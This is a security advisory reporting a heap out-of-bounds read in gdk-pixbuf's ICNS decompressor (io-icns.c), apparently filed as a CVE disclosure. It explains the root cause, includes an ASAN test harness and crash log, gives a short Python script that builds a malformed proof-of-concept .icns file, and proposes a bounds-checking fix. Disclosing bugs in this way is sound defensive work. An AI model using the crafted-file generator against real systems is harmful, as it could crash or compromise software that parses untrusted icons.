(CVE-2026-18090) Heap out-of-bounds read in uncompress() in gdk-pixbuf/io-icns.c

Reporter: Alexandru Hossu

E-mail: [email]

Component: platform

Message

Summary

Heap out-of-bounds read in uncompress() in gdk-pixbuf/io-icns.c (line 192).
The function decompresses RLE-encoded ICNS icon data but receives no bounds
information for the source buffer, and reads past the end of the block.

Component: gdk-pixbuf <= 2.44.6, gdk-pixbuf/io-icns.c
Affected function: uncompress(), called from load_icon()
CWE: CWE-125 — Out-of-bounds Read
Severity: High

Root cause

uncompress() takes a source pointer and a pixel count but no source length:

static gboolean
uncompress (unsigned size, INOUT guchar **source, OUT guchar *target,
            INOUT gsize *_remaining)
{
  guchar *data = *source;
  ...
  while (remaining > 0)
    {
      if (data[0] & 0x80)          /* line 210 — no bounds check */
        {
          count = data[0] - 125;
          ...
          *target = data[1];       /* line 219 — no bounds check */
          data += 2;
        }
      else
        {
          count = data[0] + 1;
          ...
          *target = data[i + 1];   /* line 234 — no bounds check */
          data += count + 1;
        }
      remaining -= count;
    }
}

The caller load_icon() passes the source pointer but never the source length:

guchar *data = icon;
gsize remaining = 0;

if (!uncompress (size, &data, image, &remaining))     /* R — line 304 */
  goto bail;
if (!uncompress (size, &data, image + 1, &remaining)) /* G — line 307 */
  goto bail;
if (!uncompress (size, &data, image + 2, &remaining)) /* B — line 310 */
  goto bail;

load_resources() computes plen = blocklen - sizeof(IcnsBlockHeader) (lines
114, 139, 151, 163) and stores it in isize inside load_icon(), but isize
is never forwarded to uncompress(). The decompressor reads until size*size
pixels are filled, consuming however many source bytes the RLE stream requires,
with no check that each read stays within the block.

This is distinct from CVE-2017-6313, which fixed an integer underflow in
load_resources() where blocklen < sizeof(IcnsBlockHeader) caused a negative
plen. The fix at lines 102-104 ensures plen is non-negative but does not
add any bounds checking inside uncompress().

There is also a secondary issue in load_resources() at line 123. For it32
(128x128) blocks, when blocklen = 8 (minimum allowed), plen = 0 and
*picture points past the end of the payload. The memcmp reads 4 bytes from
there, and *plen -= 4 on a gsize with value 0 wraps to a very large value.

Affected icon types

All four RLE-compressed types are affected:

Type
Size
Pixels needed

is32
16×16
256

il32
32×32
1,024

ih32
48×48
2,304

it32
128×128
16,384

ASAN confirmation

Standalone test calling verbatim uncompress() with a precisely-sized
malloc(2) source buffer:

guchar *src = malloc(2);
src[0] = 0x00;   /* non-repeating, count=1 — consumes src[0] and src[1] */
src[1] = 0xAB;
guchar *tgt = calloc(4 * 4 * 4, 1);
guchar *ptr = src;
gsize remaining = 0;
uncompress(4, &ptr, tgt, &remaining);
/* size=4 needs 16 pixels; first iteration decompresses 1 pixel and advances
   data by 2. Second iteration reads src[2] — 1 byte past the 2-byte allocation. */

Build and run:

gcc -fsanitize=address -g -O1 test_icns_direct.c -o test_icns_direct
./test_icns_direct

Output:

=================================================================
==<pid>==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b96e41e0012
READ of size 1 at 0x7b96e41e0012 thread T0
    #0 0x55d5cd0c9342 in uncompress /tmp/test_icns_direct.c:46
    #1 0x55d5cd0c9342 in main /tmp/test_icns_direct.c:101

0x7b96e41e0012 is located 0 bytes after 2-byte region [0x7b96e41e0010,0x7b96e41e0012)

Line 46 of the test is the if (data[0] & 0x80) tag read — the same read as
line 210 in the real uncompress(). The crash is 0 bytes past the end of the
2-byte allocation.

I used malloc(2) rather than a full crafted ICNS file because glib's
GByteArray uses power-of-2 allocations, so for typical file sizes the
overread lands inside allocator slack and ASAN does not trigger via the normal
load path.

Reproducer (.icns file, 32×32 variant)

import struct

def be32(n): return struct.pack('>I', n)

size = 32
mask_data = b'\xff' * (size * size)
l8mk = b'l8mk' + be32(8 + len(mask_data)) + mask_data
il32 = b'il32' + be32(8)      # blocklen=8: header only, zero payload bytes

# il32 placed last so icon pointer starts past all file data
body = l8mk + il32
open('poc.icns', 'wb').write(b'icns' + be32(8 + len(body)) + body)

The same pattern works for is32 (16×16), ih32 (48×48), and it32 (128×128).

Suggested fix

Add a source_len parameter to uncompress() and check before each read:

static gboolean
uncompress (unsigned size, INOUT guchar **source, gsize source_len,
            OUT guchar *target, INOUT gsize *_remaining)
{
    guchar *data = *source;
    guchar *source_end = *source + source_len;
    ...
    while (remaining > 0)
      {
        if (data >= source_end) return FALSE;             /* tag byte */

        if (data[0] & 0x80)
          {
            if (data + 1 >= source_end) return FALSE;     /* repeat value */
            ...
          }
        else
          {
            count = data[0] + 1;
            if (data + count >= source_end) return FALSE; /* run bytes */
            ...
          }
      }
}

load_icon() already has isize in scope from the load_resources() call —
it just needs to pass it through to uncompress().

Reporter

Alexandru Hossu — discovered via static analysis, confirmed with ASAN,
2026-04-22. I would appreciate credit in the security advisory.
